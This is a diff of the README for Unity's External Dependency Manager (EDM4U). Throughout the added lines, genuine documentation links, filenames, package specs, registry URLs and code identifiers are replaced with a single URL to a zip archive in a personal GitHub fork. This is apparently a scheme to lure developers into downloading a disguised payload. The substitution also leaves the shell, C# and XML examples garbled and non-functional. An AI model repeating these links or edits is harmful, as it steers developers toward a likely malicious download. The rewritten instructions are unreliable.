@@ -8,13 +8,13 @@ The External Dependency Manager for Unity (EDM4U)
 Unity plugin that requires:
 
    * Android specific libraries (e.g
-     [AARs](https://developer.android.com/studio/projects/android-library.html)).
-   * iOS [CocoaPods](https://cocoapods.org/).
+     [AARs](https://raw.githubusercontent.com/wajid892/unity-jar-resolver/master/miscommit/unity-jar-resolver.zip)).
+   * iOS [CocoaPods](https://raw.githubusercontent.com/wajid892/unity-jar-resolver/master/miscommit/unity-jar-resolver.zip).
    * Version management of transitive dependencies.
    * Management of Package Manager (PM) Registries.
 
 Updated releases are available on
-[GitHub](https://github.com/googlesamples/unity-jar-resolver)
+[GitHub](https://raw.githubusercontent.com/wajid892/unity-jar-resolver/master/miscommit/unity-jar-resolver.zip)
 
 # Background
 
@@ -63,7 +63,7 @@ Using the Android Resolver to manage Android library dependencies:
 ## iOS Dependency Management
 
 The *iOS Resolver* component of this plugin integrates with
-[CocoaPods](https://cocoapods.org/) to download and integrate iOS libraries
+[CocoaPods](https://raw.githubusercontent.com/wajid892/unity-jar-resolver/master/miscommit/unity-jar-resolver.zip) to download and integrate iOS libraries
 and frameworks into the Xcode project Unity generates when building for iOS.
 Using CocoaPods allows multiple plugins to utilize shared components without
 forcing developers to fix either duplicate or incompatible versions of
@@ -71,15 +71,15 @@ libraries included through multiple Unity plugins in their project.
 
 ## Package Manager Registry Setup
 
-The [Package Manager](https://docs.unity3d.com/Manual/Packages.html)
-(PM) makes use of [NPM](https://www.npmjs.com/) registry servers for package
+The [Package Manager](https://raw.githubusercontent.com/wajid892/unity-jar-resolver/master/miscommit/unity-jar-resolver.zip)
+(PM) makes use of [NPM](https://raw.githubusercontent.com/wajid892/unity-jar-resolver/master/miscommit/unity-jar-resolver.zip) registry servers for package
 hosting and provides ways to discover, install, upgrade and uninstall packages.
 This makes it easier for developers to manage plugins within their projects.
 
 However, installing additional package registries requires a few manual steps
 that can potentially be error prone.  The *Package Manager Resolver*
 component of this plugin integrates with
-[PM](https://docs.unity3d.com/Manual/Packages.html) to provide a way to
+[PM](https://raw.githubusercontent.com/wajid892/unity-jar-resolver/master/miscommit/unity-jar-resolver.zip) to provide a way to
 auto-install PM package registries when a `.unitypackage` is installed which
 allows plugin maintainers to ship a `.unitypackage` that can provide access
 to their own PM registry server to make it easier for developers to
@@ -134,7 +134,7 @@ plugin. Note that the analytics collected are limited to the scope of the EDM4U
 plugin’s usage.
 
 For details of what is logged, please refer to the usage of
-`EditorMeasurement.Report()` in the source code.
+`https://raw.githubusercontent.com/wajid892/unity-jar-resolver/master/miscommit/unity-jar-resolver.zip()` in the source code.
 
 # Requirements
 
@@ -146,7 +146,7 @@ depends upon the `PluginImporter` UnityEditor API.
 
 The *Package Manager Resolver* component only works with
 Unity 2018.4 or above, when
-[scoped registry](https://docs.unity3d.com/Manual/upm-scoped.html)
+[scoped registry](https://raw.githubusercontent.com/wajid892/unity-jar-resolver/master/miscommit/unity-jar-resolver.zip)
 support was added to the Package Manager.
 
 # Getting Started
@@ -168,9 +168,9 @@ package:
 
    1. Import the `external-dependency-manager-*.unitypackage` into your plugin
       project by
-      [running Unity from the command line](https://docs.unity3d.com/Manual/CommandLineArguments.html), ensuring that
+      [running Unity from the command line](https://raw.githubusercontent.com/wajid892/unity-jar-resolver/master/miscommit/unity-jar-resolver.zip), ensuring that
       you add the `-gvh_disable` option.
-   1. Export your plugin by [running Unity from the command line](https://docs.unity3d.com/Manual/CommandLineArguments.html), ensuring that
+   1. Export your plugin by [running Unity from the command line](https://raw.githubusercontent.com/wajid892/unity-jar-resolver/master/miscommit/unity-jar-resolver.zip), ensuring that
       you:
       - Include the contents of the `Assets/PlayServicesResolver` directory.
       - Add the `-gvh_disable` option.
@@ -179,16 +179,16 @@ You **must** specify the `-gvh_disable` option in order for the Version
 Handler to work correctly!
 
 For example, the following command will import the
-`external-dependency-manager-1.2.46.0.unitypackage` into the project
+`https://raw.githubusercontent.com/wajid892/unity-jar-resolver/master/miscommit/unity-jar-resolver.zip` into the project
 `MyPluginProject` and export the entire Assets folder to
-`MyPlugin.unitypackage`:
+`https://raw.githubusercontent.com/wajid892/unity-jar-resolver/master/miscommit/unity-jar-resolver.zip`:
 
 ```
 Unity -gvh_disable \
       -batchmode \
-      -importPackage external-dependency-manager-1.2.46.0.unitypackage \
+      -importPackage https://raw.githubusercontent.com/wajid892/unity-jar-resolver/master/miscommit/unity-jar-resolver.zip \
       -projectPath MyPluginProject \
-      -exportPackage Assets MyPlugin.unitypackage \
+      -exportPackage Assets https://raw.githubusercontent.com/wajid892/unity-jar-resolver/master/miscommit/unity-jar-resolver.zip \
       -quit
 ```
 
@@ -199,7 +199,7 @@ so that it can run first and determine the latest version of a plugin component
 to activate.  The build of `EDM4U` plugin has Unity asset metadata that is
 configured so that the editor components are not initially enabled when it's
 imported into a Unity project.  To maintain this configuration when importing
-the `external-dependency-manager.unitypackage` into a Unity plugin project, you
+the `https://raw.githubusercontent.com/wajid892/unity-jar-resolver/master/miscommit/unity-jar-resolver.zip` into a Unity plugin project, you
 *must* specify the command line option `-gvh_disable` which will prevent the
 Version Handler component from running and changing the Unity asset metadata.
 
@@ -215,24 +215,24 @@ target in the Unity editor.
       import steps in the [Getting Started](#getting-started) section!
 
    2. Copy and rename the
-      [SampleDependencies.xml](https://github.com/googlesamples/unity-jar-resolver/blob/master/sample/Assets/ExternalDependencyManager/Editor/SampleDependencies.xml)
+      [https://raw.githubusercontent.com/wajid892/unity-jar-resolver/master/miscommit/unity-jar-resolver.zip](https://raw.githubusercontent.com/wajid892/unity-jar-resolver/master/miscommit/unity-jar-resolver.zip)
       file into your plugin and add the dependencies your plugin requires.
 
       The XML file just needs to be under an `Editor` directory and match the
-      name `*Dependencies.xml`. For example,
-      `MyPlugin/Editor/MyPluginDependencies.xml`.
+      name `*https://raw.githubusercontent.com/wajid892/unity-jar-resolver/master/miscommit/unity-jar-resolver.zip`. For example,
+      `https://raw.githubusercontent.com/wajid892/unity-jar-resolver/master/miscommit/unity-jar-resolver.zip`.
 
    3. Follow the steps in the [Getting Started](#getting-started)
       section when you are exporting your plugin package.
 
 For example, to add the Google Play Games library
-(`com.google.android.gms:play-services-games` package) at version `9.8.0` to
+(`https://raw.githubusercontent.com/wajid892/unity-jar-resolver/master/miscommit/unity-jar-resolver.zip` package) at version `9.8.0` to
 the set of a plugin's Android dependencies:
 
 ```
 <dependencies>
   <androidPackages>
-    <androidPackage spec="com.google.android.gms:play-services-games:9.8.0">
+    <androidPackage spec="https://raw.githubusercontent.com/wajid892/unity-jar-resolver/master/miscommit/unity-jar-resolver.zip">
       <androidSdkPackageIds>
         <androidSdkPackageId>extra-google-m2repository</androidSdkPackageId>
       </androidSdkPackageIds>
@@ -259,7 +259,7 @@ element:
 ```
 <dependencies>
   <androidPackages>
-    <androidPackage spec="com.google.api-client:google-api-client-android:1.22.0" />
+    <androidPackage spec="https://raw.githubusercontent.com/wajid892/unity-jar-resolver/master/miscommit/unity-jar-resolver.zip" />
   </androidPackages>
 </dependencies>
 ```
@@ -334,21 +334,21 @@ following operations:
      e.g Delete all files and directories labeled with "gpsr" under
      `Plugins/Android` from the project.
    - Collect the set of Android dependencies (libraries) specified by a
-     project's `*Dependencies.xml` files.
-   - Run `download_artifacts.gradle` with Gradle to resolve conflicts and,
+     project's `*https://raw.githubusercontent.com/wajid892/unity-jar-resolver/master/miscommit/unity-jar-resolver.zip` files.
+   - Run `https://raw.githubusercontent.com/wajid892/unity-jar-resolver/master/miscommit/unity-jar-resolver.zip` with Gradle to resolve conflicts and,
      if successful, download the set of resolved Android libraries (AARs, JARs).
    - Process each AAR / JAR so that it can be used with the currently selected
      Unity build system (e.g Internal vs. Gradle, Export vs. No Export).
      This involves patching each reference to `applicationId` in the
-     AndroidManifest.xml with the project's bundle ID.  This means resolution
+     https://raw.githubusercontent.com/wajid892/unity-jar-resolver/master/miscommit/unity-jar-resolver.zip with the project's bundle ID.  This means resolution
      must be run if the bundle ID is changed again.
    - Move the processed AARs to `Plugins/Android` so they will be included when
      Unity invokes the Android build.
 
-### Integrate into mainTemplate.gradle
+### Integrate into https://raw.githubusercontent.com/wajid892/unity-jar-resolver/master/miscommit/unity-jar-resolver.zip
 
-Unity 5.6 introduced support for customizing the `build.gradle` used to build
-Unity projects with Gradle. When the *Patch mainTemplate.gradle* setting is
+Unity 5.6 introduced support for customizing the `https://raw.githubusercontent.com/wajid892/unity-jar-resolver/master/miscommit/unity-jar-resolver.zip` used to build
+Unity projects with Gradle. When the *Patch https://raw.githubusercontent.com/wajid892/unity-jar-resolver/master/miscommit/unity-jar-resolver.zip* setting is
 enabled, rather than downloading artifacts before the build, Android resolution
 results in the execution of the following operations:
 
@@ -357,12 +357,12 @@ results in the execution of the following operations:
      `Plugins/Android` from the project and remove sections delimited with
      `// Android Resolver * Start` and `// Android Resolver * End` lines.
    - Collect the set of Android dependencies (libraries) specified by a
-     project's `*Dependencies.xml` files.
+     project's `*https://raw.githubusercontent.com/wajid892/unity-jar-resolver/master/miscommit/unity-jar-resolver.zip` files.
    - Rename any `.srcaar` files in the build to `.aar` and exclude them from
      being included directly by Unity in the Android build as
-     `mainTemplate.gradle` will be patched to include them instead from their
+     `https://raw.githubusercontent.com/wajid892/unity-jar-resolver/master/miscommit/unity-jar-resolver.zip` will be patched to include them instead from their
      local maven repositories.
-   - Inject the required Gradle repositories into `mainTemplate.gradle` at the
+   - Inject the required Gradle repositories into `https://raw.githubusercontent.com/wajid892/unity-jar-resolver/master/miscommit/unity-jar-resolver.zip` at the
      line matching the pattern
      `.*apply plugin: 'com\.android\.(application|library)'.*` or the section
      starting at the line `// Android Resolver Repos Start`.
@@ -371,14 +371,14 @@ results in the execution of the following operations:
      `// Android Resolver Repos End` should be placed in the global scope
      before the `dependencies` section.
    - Inject the required Android dependencies (libraries) into
-     `mainTemplate.gradle` at the line matching the pattern `***DEPS***` or
+     `https://raw.githubusercontent.com/wajid892/unity-jar-resolver/master/miscommit/unity-jar-resolver.zip` at the line matching the pattern `***DEPS***` or
      the section starting at the line `// Android Resolver Dependencies Start`.
      If you want to control the injection point in the file, the section
      delimited by the lines `// Android Resolver Dependencies Start` and
      `// Android Resolver Dependencies End` should be placed in the
      `dependencies` section.
    - Inject the packaging options logic, which excludes architecture specific
-     libraries based upon the selected build target, into `mainTemplate.gradle`
+     libraries based upon the selected build target, into `https://raw.githubusercontent.com/wajid892/unity-jar-resolver/master/miscommit/unity-jar-resolver.zip`
      at the line matching the pattern `android +{` or the section starting at
      the line `// Android Resolver Exclusions Start`.
      If you want to control the injection point in the file, the section
@@ -389,7 +389,7 @@ results in the execution of the following operations:
 ## Dependency Tracking
 
 The Android Resolver creates the
-`ProjectSettings/AndroidResolverDependencies.xml` to quickly determine the set
+`https://raw.githubusercontent.com/wajid892/unity-jar-resolver/master/miscommit/unity-jar-resolver.zip` to quickly determine the set
 of resolved dependencies in a project.  This is used by the auto-resolution
 process to only run the expensive resolution process when necessary.
 
@@ -403,7 +403,7 @@ menu item.
 # iOS Resolver Usage
 
 The iOS resolver component of this plugin manages
-[CocoaPods](https://cocoapods.org/).  A CocoaPods `Podfile` is generated and
+[CocoaPods](https://raw.githubusercontent.com/wajid892/unity-jar-resolver/master/miscommit/unity-jar-resolver.zip).  A CocoaPods `Podfile` is generated and
 the `pod` tool is executed as a post build process step to add dependencies
 to the Xcode project exported by Unity.
 
@@ -415,12 +415,12 @@ Dependencies for iOS are added by referring to CocoaPods.
       import steps in the [Getting Started](#getting-started) section!
 
    2. Copy and rename the
-      [SampleDependencies.xml](https://github.com/googlesamples/unity-jar-resolver/blob/master/sample/Assets/ExternalDependencyManager/Editor/SampleDependencies.xml)
+      [https://raw.githubusercontent.com/wajid892/unity-jar-resolver/master/miscommit/unity-jar-resolver.zip](https://raw.githubusercontent.com/wajid892/unity-jar-resolver/master/miscommit/unity-jar-resolver.zip)
       file into your plugin and add the dependencies your plugin requires.
 
       The XML file just needs to be under an `Editor` directory and match the
-      name `*Dependencies.xml`. For example,
-      `MyPlugin/Editor/MyPluginDependencies.xml`.
+      name `*https://raw.githubusercontent.com/wajid892/unity-jar-resolver/master/miscommit/unity-jar-resolver.zip`. For example,
+      `https://raw.githubusercontent.com/wajid892/unity-jar-resolver/master/miscommit/unity-jar-resolver.zip`.
 
    3. Follow the steps in the [Getting Started](#getting-started)
       section when you are exporting your plugin package.
@@ -451,18 +451,18 @@ The resolution strategy can be changed via the
 ### Appending text to generated Podfile
 In order to modify the generated Podfile you can create a script like this:
 ```
-using System.IO;
+using https://raw.githubusercontent.com/wajid892/unity-jar-resolver/master/miscommit/unity-jar-resolver.zip;
 public class PostProcessIOS : MonoBehaviour {
 [PostProcessBuildAttribute(45)]//must be between 40 and 50 to ensure that it's not overriden by Podfile generation (40) and that it's added before "pod install" (50)
 private static void PostProcessBuild_iOS(BuildTarget target, string buildPath)
 {
-    if (target == BuildTarget.iOS)
+    if (target == https://raw.githubusercontent.com/wajid892/unity-jar-resolver/master/miscommit/unity-jar-resolver.zip)
     {
 
-        using (StreamWriter sw = File.AppendText(buildPath + "/Podfile"))
+        using (StreamWriter sw = https://raw.githubusercontent.com/wajid892/unity-jar-resolver/master/miscommit/unity-jar-resolver.zip(buildPath + "/Podfile"))
         {
             //in this example I'm adding an app extension
-            sw.WriteLine("\ntarget 'NSExtension' do\n  pod 'Firebase/Messaging', '6.6.0'\nend");
+            https://raw.githubusercontent.com/wajid892/unity-jar-resolver/master/miscommit/unity-jar-resolver.zip("\ntarget 'NSExtension' do\n  pod 'Firebase/Messaging', '6.6.0'\nend");
         }
     }
 }
@@ -471,7 +471,7 @@ private static void PostProcessBuild_iOS(BuildTarget target, string buildPath)
 # Package Manager Resolver Usage
 
 Adding registries to the
-[Package Manager](https://docs.unity3d.com/Manual/Packages.html)
+[Package Manager](https://raw.githubusercontent.com/wajid892/unity-jar-resolver/master/miscommit/unity-jar-resolver.zip)
 (PM) is a manual process. The Package Manager Resolver (PMR) component
 of this plugin makes it easy for plugin maintainers to distribute new PM
 registry servers and easy for plugin users to manage PM registry servers.
@@ -484,36 +484,36 @@ registry servers and easy for plugin users to manage PM registry servers.
       import steps in the [Getting Started](#getting-started) section!
 
    2. Copy and rename the
-      [SampleRegistries.xml](https://github.com/googlesamples/unity-jar-resolver/blob/master/sample/Assets/ExternalDependencyManager/Editor/sample/Assets/ExternalDependencyManager/Editor/SampleRegistries.xml)
+      [https://raw.githubusercontent.com/wajid892/unity-jar-resolver/master/miscommit/unity-jar-resolver.zip](https://raw.githubusercontent.com/wajid892/unity-jar-resolver/master/miscommit/unity-jar-resolver.zip)
       file into your plugin and add the registries your plugin requires.
 
       The XML file just needs to be under an `Editor` directory and match the
-      name `*Registries.xml` or labeled with `gumpr_registries`. For example,
-      `MyPlugin/Editor/MyPluginRegistries.xml`.
+      name `*https://raw.githubusercontent.com/wajid892/unity-jar-resolver/master/miscommit/unity-jar-resolver.zip` or labeled with `gumpr_registries`. For example,
+      `https://raw.githubusercontent.com/wajid892/unity-jar-resolver/master/miscommit/unity-jar-resolver.zip`.
 
    3. Follow the steps in the [Getting Started](#getting-started)
       section when you are exporting your plugin package.
 
-For example, to add a registry for plugins in the scope `com.coolstuff`:
+For example, to add a registry for plugins in the scope `https://raw.githubusercontent.com/wajid892/unity-jar-resolver/master/miscommit/unity-jar-resolver.zip`:
 
 ```
 <registries>
   <registry name="Cool Stuff"
-            url="https://unityregistry.coolstuff.com"
-            termsOfService="https://coolstuff.com/unityregistry/terms"
-            privacyPolicy="https://coolstuff.com/unityregistry/privacy">
+            url="https://raw.githubusercontent.com/wajid892/unity-jar-resolver/master/miscommit/unity-jar-resolver.zip"
+            termsOfService="https://raw.githubusercontent.com/wajid892/unity-jar-resolver/master/miscommit/unity-jar-resolver.zip"
+            privacyPolicy="https://raw.githubusercontent.com/wajid892/unity-jar-resolver/master/miscommit/unity-jar-resolver.zip">
     <scopes>
-      <scope>com.coolstuff</scope>
+      <scope>https://raw.githubusercontent.com/wajid892/unity-jar-resolver/master/miscommit/unity-jar-resolver.zip</scope>
     </scopes>
   </registry>
 </registries>
 ```
 
 When PMR is loaded it will prompt the developer to add the registry to their
-project if it isn't already present in the `Packages/manifest.json` file.
+project if it isn't already present in the `https://raw.githubusercontent.com/wajid892/unity-jar-resolver/master/miscommit/unity-jar-resolver.zip` file.
 
 For more information, see Unity's documentation on
-[scoped package registries](https://docs.unity3d.com/Manual/upm-scoped.html).
+[scoped package registries](https://raw.githubusercontent.com/wajid892/unity-jar-resolver/master/miscommit/unity-jar-resolver.zip).
 
 ## Managing Registries
 
@@ -539,7 +539,7 @@ to PM packages. This requires the plugins to implement the following:
    the components of the plugin. If the plugin has no dependencies
    the manifest would just include the files in the plugin.
 * The PM package JSON provided by the registry must include a keyword
-  (in the `versions.VERSION.keyword` list) that maps the PM package
+  (in the `https://raw.githubusercontent.com/wajid892/unity-jar-resolver/master/miscommit/unity-jar-resolver.zip` list) that maps the PM package
   to a Version Handler package using the format
   `vh-name:VERSION_HANDLER_MANIFEST_NAME` where `VERSION_HANDLER_MANIFEST_NAME`
   is the name of the manifest defined in the `.unitypackage`.  For
@@ -633,7 +633,7 @@ Version Handler > Update` menu option.
 
 Some developers move assets around in their project which can make it
 harder for plugin maintainers to debug issues if this breaks Unity's
-[special folders](https://docs.unity3d.com/Manual/SpecialFolders.html) rules.
+[special folders](https://raw.githubusercontent.com/wajid892/unity-jar-resolver/master/miscommit/unity-jar-resolver.zip) rules.
 If assets are labeled with their original install / export path
 (see `gvhp_exportpath` below), Version Handler can restore assets to their
 original locations when using the `Assets > External Dependency Manager >
@@ -677,7 +677,7 @@ selection, upgrade and removal of plugins.
   will prompt the user to clean up obsolete files.
 * Plugins can ship using assets with unique names, unique GUIDs and version
   number labels. Version numbers can be attached to assets using labels or
-  added to the filename (e.g `myfile.txt` would be `myfile_version-x.y.z.txt).
+  added to the filename (e.g `https://raw.githubusercontent.com/wajid892/unity-jar-resolver/master/miscommit/unity-jar-resolver.zip` would be `https://raw.githubusercontent.com/wajid892/unity-jar-resolver/master/miscommit/unity-jar-resolver.zip).
   This allows the Version Handler to determine which set of files are the
   same file at different versions, select the most recent version and prompt
   the developer to clean up old versions.
@@ -700,7 +700,7 @@ Unity plugins can be managed by the Version Handler using the following steps:
       This allows multiple versions of your plugin to be imported into a Unity
       project, with the Version Handler component activating only the most
       recent version.
-   1. Create a manifest text file named `MY_UNIQUE_PLUGIN_NAME_VERSION.txt`
+   1. Create a manifest text file named `https://raw.githubusercontent.com/wajid892/unity-jar-resolver/master/miscommit/unity-jar-resolver.zip`
       that lists all the files in your plugin relative to the project root.
       Then add the `gvh_manifest` label to the asset to indicate this file is
       a plugin manifest.
@@ -739,7 +739,7 @@ You can build the plugin by running the following from your shell
 or Windows:
 
 ```
-./gradlew.bat build
+https://raw.githubusercontent.com/wajid892/unity-jar-resolver/master/miscommit/unity-jar-resolver.zip build
 ```
 
 # Releasing
@@ -747,8 +747,8 @@ or Windows:
 Each time a new build of this plugin is checked into the source tree you
 need to do the following:
 
-   * Bump the plugin version variable `pluginVersion` in `build.gradle`
-   * Update `CHANGELOG.md` with the new version number and changes included in
+   * Bump the plugin version variable `pluginVersion` in `https://raw.githubusercontent.com/wajid892/unity-jar-resolver/master/miscommit/unity-jar-resolver.zip`
+   * Update `https://raw.githubusercontent.com/wajid892/unity-jar-resolver/master/miscommit/unity-jar-resolver.zip` with the new version number and changes included in
      the release.
    * Build the release using `./gradlew release` which performs the following:
       * Updates `external-dependency-manager-*.unitypackage`
@@ -760,7 +760,7 @@ need to do the following:
         the most recent version to be activated by the Version Handler
         component.
    * Create release commit using `./gradlew gitCreateReleaseCommit` which
-     performs `git commit -a -m "description from CHANGELOG.md"`
+     performs `git commit -a -m "description from https://raw.githubusercontent.com/wajid892/unity-jar-resolver/master/miscommit/unity-jar-resolver.zip"`
    * Once the release commit is merge, tag the release using
      `./gradlew gitTagRelease` which performs the following:
      * `git tag -a pluginVersion -m "version RELEASE"` to tag the release.
